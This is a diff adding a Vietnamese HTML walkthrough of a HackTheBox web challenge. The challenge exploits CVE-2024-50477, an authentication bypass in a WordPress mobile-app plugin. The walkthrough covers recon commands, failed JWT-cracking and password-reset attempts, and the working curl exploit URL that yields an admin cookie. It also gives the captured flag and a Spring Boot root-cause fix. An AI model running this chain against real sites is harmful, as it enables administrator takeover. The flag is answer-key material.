@@ -1,0 +1,273 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Hướng dẫn từng bước — Tap to Comply (Web CTF)</title>
+<style>
+  :root { --bg:#0d1117; --card:#161b22; --border:#30363d; --fg:#e6edf3; --mut:#8b949e;
+          --acc:#58a6ff; --ok:#3fb950; --warn:#d29922; --bad:#f85149; }
+  * { box-sizing:border-box; }
+  body { margin:0; background:var(--bg); color:var(--fg);
+         font-family:-apple-system,"Segoe UI",Roboto,Helvetica,Arial,sans-serif; line-height:1.7; }
+  .wrap { max-width:940px; margin:0 auto; padding:32px 20px 90px; }
+  header.hero { border:1px solid var(--border); border-radius:12px; background:linear-gradient(135deg,#161b22,#1a2332);
+                 padding:28px 32px; margin-bottom:28px; }
+  header.hero h1 { margin:0 0 6px; font-size:1.7rem; }
+  header.hero .sub { color:var(--mut); }
+  .flag-box { margin-top:16px; border:1px solid var(--ok); border-radius:10px; background:#12261a; padding:14px 18px; }
+  .flag-box code { color:var(--ok); font-size:1.05rem; font-weight:700; word-break:break-all; }
+  h2 { color:var(--acc); border-bottom:1px solid var(--border); padding-bottom:8px; margin-top:52px; }
+  h3 { color:var(--fg); margin-top:32px; }
+  h4 { color:var(--acc); margin-top:22px; }
+  .card { background:var(--card); border:1px solid var(--border); border-radius:10px; padding:18px 22px; margin:16px 0; }
+  code { font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace; font-size:.88em;
+         background:#1c2128; border:1px solid var(--border); border-radius:5px; padding:2px 6px; color:#a5d6ff; }
+  pre { background:#0d1117; border:1px solid var(--border); border-radius:10px; padding:16px; overflow-x:auto;
+        color:#c9d1d9; line-height:1.6; font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace; font-size:.87em; }
+  pre code { background:none; border:none; padding:0; color:inherit; }
+  .cm { color:#7ee787; }
+  .kw { color:#ff7b72; }
+  .st { color:#a5d6ff; }
+  .fn { color:#d2a8ff; }
+  table { border-collapse:collapse; width:100%; margin:16px 0; font-size:.92em; }
+  th,td { border:1px solid var(--border); padding:9px 12px; text-align:left; vertical-align:top; }
+  th { background:#1c2128; }
+  .tag { display:inline-block; font-size:.75rem; font-weight:700; border-radius:20px; padding:2px 10px; margin-right:6px; }
+  .tag.ok { background:#12261a; color:var(--ok); border:1px solid var(--ok); }
+  .tag.bad { background:#2d1214; color:var(--bad); border:1px solid var(--bad); }
+  .tag.warn { background:#2a2110; color:var(--warn); border:1px solid var(--warn); }
+  .note { border-left:4px solid var(--warn); background:#211d12; padding:12px 16px; border-radius:0 8px 8px 0; margin:14px 0; }
+  .tip { border-left:4px solid var(--ok); background:#12261a55; padding:12px 16px; border-radius:0 8px 8px 0; margin:14px 0; }
+  .verify { border-left:4px solid var(--acc); background:#0d1a2b; padding:12px 16px; border-radius:0 8px 8px 0; margin:16px 0; }
+  .verify b:first-child { color:var(--acc); }
+  .muted { color:var(--mut); }
+  ol.steps > li, ul.dash > li { margin-bottom:8px; }
+  .toc a { color:var(--acc); text-decoration:none; }
+  .toc a:hover { text-decoration:underline; }
+  .spring { border:1px solid #6e7681; border-radius:10px; margin:16px 0; overflow:hidden; }
+  .spring .hd { background:#12324a; padding:8px 16px; font-weight:700; font-size:.9em; color:#79c0ff; }
+  .spring .bd { padding:4px 16px 14px; background:#0d1117; }
+  .spring.bad-ex .hd { background:#3d1d22; color:#ffa198; }
+</style>
+</head>
+<body>
+<div class="wrap">
+
+<header class="hero">
+  <h1>📲 Tap to Comply — Authentication Bypass (CVE-2024-50477) trong plugin WordPress</h1>
+  <div class="sub">Challenge Web · HackTheBox Event 3692 (Intermediate — NAB Internal CTF) · <span class="muted">target: <code>154.57.164.64:40249</code> (đổi mỗi lần spawn)</span></div>
+  <div class="flag-box">
+    🏁 Flag (đã lấy được, <b>chưa nộp</b> — bạn tự submit):<br>
+    <code>HTB{r3m0t3_d00m_f0r_th3_c0w_3ea0a3382227623fe65ab6876e561b84}</code>
+  </div>
+  <div class="card toc" style="margin-top:16px">
+    <b>Mục lục:</b><br>
+    <a href="#p0">Phần 0 — Khái niệm nền</a> ·
+    <a href="#p1">Phần 1 — Recon</a> ·
+    <a href="#p2">Phần 2 — Dead ends</a> ·
+    <a href="#p3">Phần 3 — Breakthrough</a> ·
+    <a href="#p4">Phần 4 — Kết liễu</a> ·
+    <a href="#p5">Phần 5 — Root cause (Java Spring Boot)</a> ·
+    <a href="#p6">Phần 6 — Checklist</a>
+  </div>
+</header>
+
+<p class="muted">Bài viết giả định bạn là lập trình viên Java Spring Boot, chưa chuyên sâu bảo mật WordPress. Mọi khái niệm lạ (plugin WordPress, REST API, CVE, authentication cookie) đều được giải thích ở Phần 0 trước khi dùng.</p>
+
+<h2 id="p0">Phần 0 — Kiến thức nền cần có trước khi bắt đầu</h2>
+
+<h3>0.1 — WordPress, plugin và "attack surface" mở rộng</h3>
+<div class="card">
+  <p><b>WordPress</b> là CMS (hệ quản trị nội dung) viết bằng PHP chiếm phần lớn web trên thế giới. <b>Plugin</b> là module cài thêm để mở rộng chức năng — mỗi plugin là một gói PHP đặt trong <code>wp-content/plugins/&lt;tên-plugin&gt;/</code>, đăng ký thêm endpoint REST, hook, shortcode...</p>
+  <p>Điểm nguy hiểm: <b>mỗi plugin là một ứng dụng web thu nhỏ với attack surface riêng</b>, và plugin thường do bên thứ ba viết với chất lượng bảo mật không đồng đều. Một lỗi nghiêm trọng trong <i>bất kỳ</i> plugin nào cũng sở hữ luôn toàn bộ quyền của WordPress — vì plugin chạy cùng tiến trình, cùng DB, cùng session với core.</p>
+  <p>Bài này là minh họa hoàn hảo: core WordPress không lỗi, nhưng một plugin <i>mobile app builder</i> để lộ một tham số <code>uid</code> không kiểm tra → toàn bộ hệ thống sụp đổ.</p>
+  <div class="verify"><b>✔ Cách verify:</b> truy cập <code>/wp-json/</code> của bất kỳ site WordPress nào — field <code>namespaces</code> liệt kê mọi plugin đang đăng ký REST API. Plugin nào cũng nhìn thấy được, không cần đăng nhập.</div>
+</div>
+
+<h3>0.2 — CVE và cách tra cứu lỗ hổng plugin</h3>
+<div class="card">
+  <p><b>CVE</b> (Common Vulnerabilities and Exposures) là mã định danh công khai cho một lỗ hổng bảo mật đã được công bố. Khi recon cho thấy một phần mềm cụ thể + phiên bản cụ thể (ví dụ "Stacks Mobile App Builder 5.2.3"), bước đầu tiên nên làm là <b>tra CVE theo tên + version</b> — nhiều khi có sẵn cả PoC (proof of concept) công khai.</p>
+  <p>Trong bài này, recon lộ version 5.2.3 qua endpoint <code>/v4/get-stacks-version</code>, và tra cứu cho thấy đúng version này bị <b>CVE-2024-50477</b>: "Authentication Bypass ... not properly verifying a user's identity prior to authenticating them via the receive_request_checkout() function. This makes it possible for unauthenticated attackers to log in as any user based on user ID."</p>
+  <div class="spring">
+    <div class="hd">Tương đồng Java Spring Boot — tương tự dependency scanning</div>
+    <div class="bd"><pre><code><span class="cm">// Trong Spring, tương đương là phát hiện dependency yếu:</span>
+<span class="cm">// ./mvnw dependency:tree → thấy com.fasterxml.jackson-databind 2.9.0</span>
+<span class="cm">// → tra CVE-2020-8840 (deserialization RCE) → nâng cấp phiên bản</span>
+<span class="cm">// Công cụ: OWASP Dependency-Check, Snyk, Trivy scan image Docker.</span>
+<span class="cm">// Nguyên tắc giống hệt: biết chính xác tên + version của thành phần</span>
+<span class="cm">// thứ ba → tra lỗ đã công bố → vá hoặc khai thác (tuỳ phe).</span></code></pre></div>
+  </div>
+  <div class="verify"><b>✔ Cách verify:</b> tìm kiếm "stacks-mobile-app-builder CVE" trên NVD hoặc GitHub — kết quả đầu tiên là CVE-2024-50477 với PoC công khai <code>/?mobile_co=1&amp;uid=1</code>. Đối chiếu version: endpoint trả 5.2.3 ≤ 5.2.3 → bị ảnh hưởng.</div>
+</div>
+
+<h3>0.3 — Authentication cookie và "logged in" trong WordPress</h3>
+<div class="card">
+  <p>WordPress nhận biết người dùng đã đăng nhập qua <b>cookie</b> (thường là <code>wordpress_logged_in_&lt;hash&gt;</code>), chứa username + hạn + chữ ký HMAC bằng salt trong <code>wp-config.php</code>. Bất kỳ request nào kèm cookie hợp lệ đều được coi là chính chủ — <b>ai tạo được cookie đó là thành người đó</b>.</p>
+  <p>Lỗ hổng của plugin này nằm ở chỗ: khi nhận tham số <code>mobile_co=1&amp;uid=1</code>, nó <b>tự động gọi hàm đăng nhập WordPress với user ID = 1</b> (admin) mà không hỏi mật khẩu, không hỏi bất kỳ bằng chứng nào — rồi set cookie đăng nhập cho trình duyệt. Ta chỉ việc giữ cookie đó và vào <code>/wp-admin</code>.</p>
+  <div class="verify"><b>✔ Cách verify:</b> sau khi gọi URL khai thác, mở DevTools → Application → Cookies — sẽ thấy cookie <code>wordpress_logged_in_*</code> mới xuất hiện. Đó là bằng chứng server đã "đăng nhập" cho ta.</div>
+</div>
+
+<h3>0.4 — Các cờ công cụ dùng xuyên suốt bài</h3>
+<div class="card">
+<table>
+  <tr><th>Cờ</th><th>Ý nghĩa</th><th>Tại sao dùng ở đây</th></tr>
+  <tr><td><code>curl -c jar</code></td><td>lưu cookie vào file</td><td>giữ cookie admin cấp sau bưới bypass</td></tr>
+  <tr><td><code>curl -b jar</code></td><td>gửi cookie từ file</td><td>mang cookie admin vào /wp-admin</td></tr>
+  <tr><td><code>curl -L</code></td><td>theo redirect</td><td>bước bypass redirect qua vài vòng</td></tr>
+  <tr><td><code>curl -w</code></td><td>in status/size ra stderr</td><td>verify từng bước mà không làm bẩn output</td></tr>
+  <tr><td><code>grep -oE</code></td><td>trích chuỗi khớp regex</td><td>móc flag <code>HTB{...}</code> khỏi HTML dài</td></tr>
+</table>
+</div>
+
+<h2 id="p1">Phần 1 — Recon: nhận diện plugin và version</h2>
+<p class="muted">Recon có hệ thống: đọc wp-json → lộ tên plugin → lộ version → tra CVE. Ba bước, không brute-force gì cả.</p>
+
+<h3>1.1 — Đọc bản đồ REST API</h3>
+<pre><code><span class="cm"># wp-json liệt kê mọi namespace và route — đây là "bản đồ" của site</span>
+curl -s http://154.57.164.64:40249/wp-json/ | python3 -m json.tool | head -40</code></pre>
+<p>Phát hiện namespace lạ không thuộc WordPress core: <code>avaris-wc-rest/v1..v3</code> và <code>v4</code> — dấu hiệu của plugin thứ ba. Các endpoint gợI ý đây là plugin <b>mobile app builder</b>: register/login bằng device_id, points, gdpr/export...</p>
+<div class="verify"><b>✔ Cách verify:</b> trong JSON trả về, mảng <code>namespaces</code> chứa <code>avaris-wc-rest/v3</code> và <code>v4</code> — hai namespace không có trong WordPress core. Ghi nhớ: plugin tên là avaris/stacks.</div>
+
+<h3>1.2 — Kích hoạt lỗi PHP để lộ đường dẫn plugin thật</h3>
+<pre><code><span class="cm"># endpoint get-stacks-orders thiếu tham số → PHP Warning lộ absolute path</span>
+curl -s "http://154.57.164.64:40249/wp-json/v4/get-stacks-orders"</code></pre>
+<pre><code><span class="kw">Warning</span>: Undefined array key "order_id" in
+<b>/var/www/html/wp-content/plugins/stacks-mobile-app-builder/api/builder/orders.php</b>
+on line <b>26</b></code></pre>
+<p>Tên plugin thật: <code>stacks-mobile-app-builder</code>. Đồng thời:</p>
+<pre><code><span class="cm"># endpoint version trả về ngay</span>
+curl -s "http://154.57.164.64:40249/wp-json/v4/get-stacks-version"
+<span class="cm"># → {"version":"5.2.3"}</span></code></pre>
+<div class="verify"><b>✔ Cách verify:</b> kết hợp hai response: plugin = <code>stacks-mobile-app-builder</code>, version = <code>5.2.3</code>. Hai dữ liệu này đủ để tra CVE.</div>
+
+<h3>1.3 — Tra cứu CVE theo tên + version</h3>
+<p>Tìm kiếm "stacks-mobile-app-builder CVE" trả về ngay kết quả đầu tiên:</p>
+<div class="card">
+  <b>CVE-2024-50477</b> — "Stacks Mobile App Builder &lt;= 5.2.3 — Authentication Bypass via Account Takeover" (CVSS 9.8, Patchstack, tháng 10/2024).<br><br>
+  Trích advisory: <i>"not properly verifying a user's identity prior to authenticating them via the <code>receive_request_checkout()</code> function. This makes it possible for unauthenticated attackers to log in as any user based on user ID."</i><br><br>
+  PoC công khai: <code>/?mobile_co=1&amp;uid=1</code> → nhận cookie của user ID 1 (admin).
+</div>
+<div class="verify"><b>✔ Cách verify:</b> đối chiếu version: 5.2.3 ≤ 5.2.3 → bị ảnh hưởng. PoC không yêu cầu authentication, không yêu cầu tool đặc biệt — chỉ là một URL.</div>
+
+<h2 id="p2">Phần 2 — Các hướng tấn công trực diện (thất bại, và cách verify)</h2>
+<p class="muted">Trước khi tìm ra CVE, ta đã thử các đường trực diện — tất cả đều chết, nhưng mỗi cái chết đều loại trừ một giả định và dẫn tới CVE.</p>
+
+<h3><span class="tag bad">THẤT BẠI</span> 2.1 — Đăng ký + đăng nhập user thường qua API của plugin</h3>
+<pre><code><span class="cm"># đăng ký user mới qua endpoint của plugin — thành công</span>
+curl -s -X POST http://154.57.164.64:40249/wp-json/avaris-wc-rest/v3/register \
+  -H "Authorization: Bearer &lt;anonymous-token&gt;" \
+  -H 'Content-Type: application/json' \
+  -d '{"type":"manual","email":"probe@t.com","first_name":"A","last_name":"B",
+       "password":"password123","device_id":"550e8400-e29b-41d4-a716-446655440000",
+       "device_type":"android"}'
+<span class="cm"># → {"success":true,...} nhưng user chỉ là subscriber, không có gì trong dashboard</span></code></pre>
+<p>Kết luận: user tự đăng ký có quyền tối thiểu, không vào được wp-admin. Cần một đường leo lên admin.</p>
+<div class="verify"><b>✔ Cách verify:</b> login thành công trả JWT với <code>data.user.id = "16"</code> — ID lớn, là user tự đăng ký. Vào <code>/wp-admin</code> với cookie của user này (nếu có) sẽ bị redirect về trang chủ vì thiếu capability <code>manage_options</code>.</div>
+
+<h3><span class="tag bad">THẤT BẠI</span> 2.2 — Thử đoán secret của JWT (HS256) để forge token admin</h3>
+<pre><code><span class="cm"># token anonymous cấp sẵn qua GET /v3/token — HS256</span>
+<span class="cm"># thử dictionary phổ biến + rockyou 14 triệu mật khẩu bằng hashcat mode 16500</span>
+hashcat -m 16500 jwt.txt rockyou.txt --force -O
+<span class="cm"># → không ra</span></code></pre>
+<p>Kết luận: secret không nằm trong wordlist phổ biến — brute-force hướng này không hiệu quả. Đồng thời alg:none bypass cũng thất bại (server từ chối). Gạt phương án forge JWT.</p>
+<div class="verify"><b>✔ Cách verify:</b> <code>hashcat --show</code> trả rỗng sau khi chạy hết wordlist; token alg:none bị từ chối với 401 <code>stacks_rest_cannot_view</code> — cả hai đều là bằng chứng hướng này không đi được.</div>
+
+<h3><span class="tag bad">THẤT BẠI</span> 2.3 — Reset mật khẩu admin qua forgot-password của plugin</h3>
+<pre><code><span class="cm"># endpoint forgot-password yêu cầu cả new_password — nghe rất khả nghi</span>
+curl -s -X POST .../avaris-wc-rest/v3/forgot-password \
+  -d '{"email":"app-dev@lemon.htb","new_password":"Pwn12345!x"}'
+<span class="cm"># → 500 "Sorry we could not send email to this mail please try again."</span>
+<span class="cm"># activate_new_password cần "secret" gửi qua email → container không gửi mail được</span></code></pre>
+<p>Email admin lộ qua <code>/v4/get-stacks-users</code> (endpoint không auth lộ toàn bộ user + bcrypt hash), nhưng flow reset cần <code>secret</code> gửi qua email — mà container không có mail server. Crack bcrypt hash của admin cũng bất khả thi trong thời gian cho phép (cost 10 → vài chục hash/giây trên CPU).</p>
+<p>Kết luận: đường reset password chết vì thiếu mail server. Nhưng chính endpoint <code>get-stacks-users</code> không-auth này (cũng là một lỗi của plugin) đã giúp xác nhận user ID 1 = admin.</p>
+<div class="verify"><b>✔ Cách verify:</b> forgot-password trả 500 với thông báo lỗi gửi mail; activate_new_password redirect kèm <code>change_pass_res=fail</code> dù thử nhiều secret. Login sau đó vẫn "the provided password is wrong" → password chưa đổi.</div>
+
+<h2 id="p3">Phần 3 — Đột phá: CVE-2024-50477</h2>
+
+<h3>3.1 — Payload khai thác</h3>
+<p>PoC công khai của CVE chỉ là một URL với hai tham số:</p>
+<table>
+  <tr><th>Tham số</th><th>Giá trị</th><th>Ý nghĩa</th></tr>
+  <tr><td><code>mobile_co</code></td><td><code>1</code></td><td>bật "mobile checkout mode" — kích hoạt nhánh code lỗi trong <code>receive_request_checkout()</code></td></tr>
+  <tr><td><code>uid</code></td><td><code>1</code></td><td>user ID muốn đóng vai — ID 1 trong WordPress luôn là user đầu tiên, gần như luôn là admin</td></tr>
+</table>
+<pre><code><span class="cm"># bước 1: gọi URL bypass, giữ cookie vào file</span>
+curl -s -c admin.jar -o /dev/null -L \
+  "http://154.57.164.64:40249/?mobile_co=1&amp;uid=1"
+<span class="cm"># → server set cookie wordpress_logged_in_* cho user ID 1 vào jar</span></code></pre>
+<div class="note">Tại sao lỗi này tồn tại: hàm <code>receive_request_checkout()</code> dùng cho luồng thanh toán của app mobile — nó cần "đăng nhập hộ" user để tạo đơn hàng. Người viết plugin cho rằng chỉ app mobile hợp lệ mới gọi được hàm này, nhưng <b>không kiểm tra gì cả</b>: bất kỳ ai gửi <code>uid</code> là được đăng nhập. Đây là ví dụ điển hình của "security through obscurity" sụp đổ.</div>
+<div class="verify"><b>✔ Cách verify:</b> sau curl, kiểm tra cookie jar — xuất hiện cookie tên dạng <code>wordpress_logged_in_&lt;32 hex&gt;</code>. Nếu chỉ có <code>wordpress_test_cookie</code> mà không có <code>logged_in</code> → payload chưa ăn, kiểm tra lại version plugin.</div>
+
+<h2 id="p4">Phần 4 — Kết liễu: vào dashboard lấy flag</h2>
+<pre><code><span class="cm"># bước 2: mang cookie admin vào wp-admin, lưu HTML về</span>
+curl -s -b admin.jar -L -o dashboard.html \
+  "http://154.57.164.64:40249/wp-admin/"
+<span class="cm"># bước 3: móc flag</span>
+grep -oE 'HTB\{[^}]+\}' dashboard.html</code></pre>
+<pre><code>HTB{r3m0t3_d00m_f0r_th3_c0w_3ea0a3382227623fe65ab6876e561b84}</code></pre>
+<p>Đúng như đề bài: <b>"The flag will be presented on logging into the dashboard"</b> — flag nằm ngay trên trang dashboard admin sau khi đăng nhập thành công.</p>
+<div class="verify"><b>✔ Cách verify:</b> (1) response <code>/wp-admin/</code> trả 200 với kích thước ~130KB thay vì redirect về wp-login; (2) HTML chứa <code>welcome-panel</code> và chữ "Dashboard" — hai dấu hiệu của trang admin thật; (3) chuỗi <code>HTB{...}</code> xuất hiện trong HTML. Ba điều kiện cùng thỏa.</div>
+
+<h3>Bảng tổng kết chuỗi tấn công</h3>
+<table>
+  <tr><th>#</th><th>Hành động</th><th>Dựa vào đâu</th><th>Verify bằng</th></tr>
+  <tr><td>1</td><td>Đọc <code>/wp-json/</code>, lộ namespace plugin lạ</td><td>WP REST API công khai route</td><td>namespaces chứa <code>avaris-wc-rest</code>, <code>v4</code></td></tr>
+  <tr><td>2</td><td>Kích PHP warning lộ tên plugin; đọc version</td><td>endpoint thiếu param + get-stacks-version</td><td>path <code>stacks-mobile-app-builder</code>, version 5.2.3</td></tr>
+  <tr><td>3</td><td>Tra CVE theo tên+version → CVE-2024-50477</td><td>Patchstack advisory công khai</td><td>5.2.3 ≤ 5.2.3, có PoC</td></tr>
+  <tr><td>4</td><td><code>GET /?mobile_co=1&amp;uid=1</code></td><td>receive_request_checkout không kiểm tra uid</td><td>cookie <code>wordpress_logged_in_*</code> xuất hiện</td></tr>
+  <tr><td>5</td><td>GET <code>/wp-admin/</code> kèm cookie</td><td>WP tin cookie = chủ session</td><td>200 + Dashboard + flag</td></tr>
+</table>
+
+<h2 id="p5">Phần 5 — Root cause qua góc nhìn Java Spring Boot</h2>
+
+<div class="spring bad-ex">
+  <div class="hd">❌ Code sai — bản chất tương đương trong Spring Boot</div>
+  <div class="bd"><pre><code><span class="cm">// "Bản Java" của receive_request_checkout(): tin hoàn toàn tham số client</span>
+<span class="kw">@GetMapping</span>(<span class="st">"/checkout"</span>)
+<span class="kw">public</span> String mobileCheckout(<span class="kw">@RequestParam</span> String uid) {
+    <span class="cm">// ← KHÔNG kiểm tra authentication, KHÔNG kiểm tra uid có phải của mình</span>
+    User user = userRepository.findById(Long.parseLong(uid));   <span class="cm">// uid=1 → admin</span>
+    Authentication auth = <span class="kw">new</span> UsernamePasswordAuthenticationToken(
+        user, <span class="kw">null</span>, user.getAuthorities());          <span class="cm">// ← tạo session cho BẤT KỲ ai</span>
+    SecurityContextHolder.getContext().setAuthentication(auth);
+    <span class="kw">return</span> <span class="st">"redirect:/checkout/success"</span>;  <span class="cm">// ← giờ request này LÀ admin</span>
+}
+<span class="cm">// Ai gọi /checkout?uid=1 cũng thành admin. Đúng nghĩa "remote doom for the cow".</span></code></pre></div>
+</div>
+<div class="spring">
+  <div class="hd">✅ Code sửa — xác thực người gọi, không tin tham số</div>
+  <div class="bd"><pre><code><span class="kw">@GetMapping</span>(<span class="st">"/checkout"</span>)
+<span class="kw">public</span> String mobileCheckout(<span class="kw">@AuthenticationPrincipal</span> User currentUser) {
+    <span class="cm">// ← lấy user TỪ SESSION đã xác thực, không từ tham số client.</span>
+    <span class="cm">// Không có param uid nào cả — mọi thao tác dùng currentUser.getId().</span>
+    <span class="kw">if</span> (currentUser == <span class="kw">null</span>) <span class="kw">throw new</span> AccessDeniedException();
+    ...
+}</code></pre></div>
+</div>
+<p><b>Bốn bài học gốc rễ:</b></p>
+<ul class="dash">
+  <li><b>Không bao giờ nhận identity từ client.</b> Tham số <code>uid</code> do người gọi tự gửi — nó là dữ liệu, không phải danh tính. Danh tính phải đến từ session/token đã xác thực.</li>
+  <li><b>"Secure by default" là myth khi API không kiểm tra gì.</b> Plugin giả định "chỉ app mobile gọi được" — nhưng endpoint public, ai gọi cũng được. Mọi API phải tự vệ độc lập.</li>
+  <li><b>Plugin thứ ba = rủi ro của cả hệ thống.</b> Một hàm checkout trong plugin mobile builder mở toang quyền administrator. Cần kiểm soát plugin cài vào (allowlist, audit, cập nhật khi có CVE).</li>
+  <li><b>Lỗi lộ thông tin kết hợp thành chuỗi.</b> Version endpoint + PHP warning + get-stacks-users không-auth — từng cái nhỏ, gộp lại đủ để xác định chính xác CVE và nạn nhân (admin = ID 1, email app-dev@lemon.htb).</li>
+</ul>
+
+<h2 id="p6">Phần 6 — Bài học &amp; checklist khi tự làm lại</h2>
+<div class="card">
+<ol class="steps">
+  <li><b><code>/wp-json/</code> là bản đồ miễn phí.</b> Mọi site WordPress đều liệt kê namespace plugin và route. Đọc nó trước khi làm bất cứ gì khác.</li>
+  <li><b>Kích lỗi PHP để lộ path.</b> Thiếu tham số bắt buộc thường trả Warning kèm absolute path → biết chính xác plugin và cấu trúc thư mục.</li>
+  <li><b>Version + tên phần mềm = tra CVE ngay.</b> Đừng brute-force khi advisory công khai đã có PoC. 5 phút tra cứu thay cho giờ crack hash.</li>
+  <li><b>PHP Warning/notice cũng là lỗ hổng thông tin.</b> Một endpoint lộ version, một endpoint lộ path, một endpoint lộ danh sách user — gộp lại thành bức tranh đầy đủ.</li>
+  <li><b>Cookie-based auth: ai có cookie là chủ.</b> Bài học luôn đúng: không quan trọng cookie tạo ra bằng cách nào (đăng nhập thật hay bypass lỗi), server chỉ thấy cookie hợp lệ.</li>
+  <li><b>Khi flow "chuẩn" chết (mail gửi không được), đừng bám vào nó.</b> forgot-password chết vì thiếu mail server → chuyển sang CVE auth bypass. Dead end nhanh, chuyển hướng nhanh.</li>
+</ol>
+</div>
+<div class="tip"><b>Checklist tự làm lại:</b> đọc <code>/wp-json/</code> → tìm namespace lạ → kích PHP warning lộ plugin path → đọc version endpoint → tra CVE tên+version → gọi <code>/?mobile_co=1&amp;uid=1</code> với cookie jar → kiểm tra <code>wordpress_logged_in_*</code> trong jar → GET <code>/wp-admin/</code> kèm cookie → grep <code>HTB{</code>.</div>
+
+<p class="muted" style="margin-top:40px">Flag đã lấy thành công nhưng <b>chưa nộp</b> — bạn tự submit ở portal HTB. Docker instance đã stop. Chúc mừng!</p>
+
+</div>
+</body>
+</html>
